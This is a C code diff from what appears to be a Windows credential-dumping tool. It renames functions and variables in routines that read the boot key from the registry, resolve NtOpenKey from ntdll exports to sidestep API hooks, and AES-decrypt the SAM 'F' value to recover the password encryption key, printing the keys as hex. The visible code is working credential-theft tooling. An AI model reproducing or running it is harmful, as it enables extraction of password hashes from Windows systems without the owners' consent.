@@ -210,7 +210,7 @@ void bytes_to_hex(unsigned char *src, size_t len, char *dest) {
 
 const int MAXREGVAL = 1024;
 
-UINT8 *ExtractBootKey() {
+UINT8 *ExtractSysKey() {
   static UINT8 result[16];
   UINT8 scrambled[16];
   int scrambled_len = 0;
@@ -312,14 +312,14 @@ UINT8 *ExtractBootKey() {
   const int resultSize = 16;
   char hexStr[33];
   bytes_to_hex(result, resultSize, hexStr);
-  printf("bootkey: 0x%s\n", hexStr);
+  printf("syskey: %s\n", hexStr);
 
   return result;
 }
 
-UINT8 *ExtractSystemKey(UINT8 *bootkey) {
+UINT8 *ExtractPEKKey(UINT8 *bootkey) {
   HANDLE key;
-  UINT8 *sysKey;
+  UINT8 *PEKKey;
   ntdll = get_mod_base("ntdll.dll");
   NtOpenKey_t NtOpenKey =
       (NtOpenKey_t)get_function_from_exports(ntdll, "NtOpenKey");
@@ -352,7 +352,7 @@ UINT8 *ExtractSystemKey(UINT8 *bootkey) {
   NTSTATUS err = NtOpenKey(&key, KEY_READ, &objAttr);
   if (err != 0) {
     printf("cannot open key: 0x%X\n", err);
-    return sysKey;
+    return PEKKey;
   }
   UNICODE_STRING valueName;
   RtlInitUnicodeString(&valueName, L"F");
@@ -368,13 +368,13 @@ UINT8 *ExtractSystemKey(UINT8 *bootkey) {
   }
   sam_key_data_aes samAESData;
   memcpy(&samAESData, buf, sizeof(samAESData));
-  BYTE *sysKeyIV = samAESData.Salt;
+  BYTE *PEKKeyIV = samAESData.Salt;
   BYTE *encSysKey = malloc(samAESData.DataLen);
   memcpy(encSysKey, samAESData.Data, samAESData.DataLen);
   struct AES_ctx ctx;
 
   uint8_t *aeskey = (uint8_t *)bootkey;
-  uint8_t *keyIV = (uint8_t *)sysKeyIV;
+  uint8_t *keyIV = (uint8_t *)PEKKeyIV;
 
   AES_init_ctx_iv(&ctx, aeskey, keyIV);
 
@@ -384,10 +384,10 @@ UINT8 *ExtractSystemKey(UINT8 *bootkey) {
 
   AES_CBC_decrypt_buffer(&ctx, plaintext, sizeof(samAESData.Data));
 
-  sysKey = (UINT8 *)plaintext;
+  PEKKey = (UINT8 *)plaintext;
   char hexStr[sizeof(plaintext) * 2 + 1];
-  bytes_to_hex(sysKey, sizeof(plaintext), hexStr);
-  printf("syskey: %s\n", hexStr);
+  bytes_to_hex(PEKKey, sizeof(plaintext), hexStr);
+  printf("PEK key: %s\n", hexStr);
 
-  return sysKey;
+  return PEKKey;
 }
